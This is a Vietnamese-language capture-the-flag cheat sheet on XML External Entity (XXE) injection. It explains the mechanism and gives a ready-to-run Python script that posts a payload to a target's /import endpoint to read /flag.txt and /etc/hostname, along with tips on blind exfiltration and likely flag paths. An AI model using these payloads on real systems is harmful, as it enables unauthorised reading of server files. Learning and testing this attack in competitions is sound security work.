# XXE (XML External Entity — khai 1 "tên viết tắt" trỏ tới file bí mật)

XML là 1 định dạng dữ liệu có cấu trúc (giống HTML nhưng tự do hơn), hay dùng trong file cấu hình, SVG, hoặc 1 số API. Chuẩn XML cho phép khai báo "entity" — hiểu đơn giản là 1 "tên viết tắt": khi parser (bộ đọc XML) gặp tên đó, nó tự thay bằng nội dung thật đã định nghĩa. Vấn đề là chuẩn XML còn cho phép entity đó trỏ tới nội dung BÊN NGOÀI — kể cả 1 file trên máy chủ, hoặc 1 địa chỉ mạng. Nếu web đọc file XML do bạn gửi mà không chặn tính năng này, bạn tự khai 1 "tên viết tắt" trỏ tới file bí mật (ví dụ file chứa flag), server sẽ tự đọc hộ file đó rồi nhét kết quả ngay vào response trả về cho bạn.

Trên Burp bạn nhận ra lỗi này khi: app nhận file XML/SVG trực tiếp (header `Content-Type: application/xml` hoặc `text/xml`), hoặc có chức năng upload file đuôi `.xml`/`.svg` rồi hiển thị lại nội dung — gửi thử payload đọc 1 file nhỏ quen thuộc (`/etc/hostname`) để xác nhận, nếu response hiện đúng nội dung file đó thì chắc chắn dính XXE.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Payload XXE cơ bản: khai 1 "tên viết tắt" (entity) tên "xxe", trỏ tới file flag.txt
    # trên máy chủ, rồi gọi lại tên đó bằng &xxe; ngay trong nội dung XML để parser tự
    # thay bằng nội dung file thật khi trả response.
    xml_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>&xxe;</root>"""

    r = session.post(
        f"{base_url}/import",
        data=xml_payload,
        headers={"Content-Type": "application/xml"},
        timeout=5,
    )

    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r.text)
    if m:
        return m.group(0)

    # Nếu chưa ra flag, thử lại với 1 file quen thuộc để xác nhận cơ chế có hoạt động không
    # (không có trong flow lấy flag chính, chỉ để debug khi payload trên không ăn)
    probe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>"""
    r2 = session.post(
        f"{base_url}/import",
        data=probe_payload,
        headers={"Content-Type": "application/xml"},
        timeout=5,
    )
    print("probe /etc/hostname ->", r2.status_code, r2.text[:200])
    return None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- `xml_payload` là 1 chuỗi nhiều dòng (dùng `"""..."""` để viết chuỗi trải nhiều dòng trong Python, không cần nối bằng `+`), đúng cú pháp 1 file XML thật.
- `<!DOCTYPE foo [ ... ]>` là phần khai báo "khuôn" của tài liệu XML, tên `foo` không quan trọng (đặt tên gì cũng được) — mọi thứ trong cặp ngoặc vuông `[ ]` là nơi định nghĩa entity (tên viết tắt).
- `<!ENTITY xxe SYSTEM "file:///flag.txt">` — định nghĩa 1 entity tên `xxe`, từ khóa `SYSTEM` nghĩa là "entity ngoài" (external), giá trị là nội dung file `/flag.txt` trên máy chủ web. Dấu `///` sau `file:` là cú pháp chuẩn để chỉ 1 đường dẫn tuyệt đối trên máy (không phải URL mạng).
- `<root>&xxe;</root>` — `&xxe;` là cách "gọi" entity vừa định nghĩa, đặt đúng chỗ bạn muốn giá trị (nội dung file flag) xuất hiện trong XML. Nếu app in lại nội dung thẻ `<root>` ra response, bạn sẽ thấy ngay nội dung file flag ở đó.
- `headers={"Content-Type": "application/xml"}` — bắt buộc phải khai đúng Content-Type là XML (không phải JSON hay form thường), nếu không server có thể không gọi đúng bộ phân tích XML để xử lý payload.
- Phần `probe_payload` chỉ dùng để DEBUG: nếu payload đọc flag không ra kết quả, đổi tạm sang đọc file quen thuộc `/etc/hostname` để xác nhận cơ chế XXE có hoạt động hay không, trước khi nghi ngờ do sai đường dẫn file flag.

## Lưu ý nhanh

- Nếu response không hiện lỗi gì nhưng cũng không thấy nội dung file đâu (app không in giá trị entity trực tiếp ra), đây là trường hợp "mù" (blind/OOB) — cần dựng 1 HTTP server riêng (`python3 -m http.server`) để nhận dữ liệu bị "gửi ra ngoài", không nằm trong snippet rút gọn này.
- Nếu response báo lỗi kiểu "DOCTYPE is not allowed", parser đã được cấu hình chặn hoàn toàn — không khai thác được qua XXE kinh điển ở endpoint đó.
- Nhiều app chỉ nhận JSON ở hầu hết endpoint nhưng vẫn còn 1 endpoint khác (ít dùng, ví dụ import/upload) nhận XML — luôn kiểm tra kỹ các chức năng "import", "upload file cấu hình" trước khi bỏ qua XXE.
- Sai đường dẫn file (ví dụ `/flag.txt` không đúng vị trí thật) sẽ khiến response không có gì — thử thêm vài vị trí quen thuộc (`/flag`, `/app/flag.txt`, `/root/flag.txt`) nếu payload đầu không ăn.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
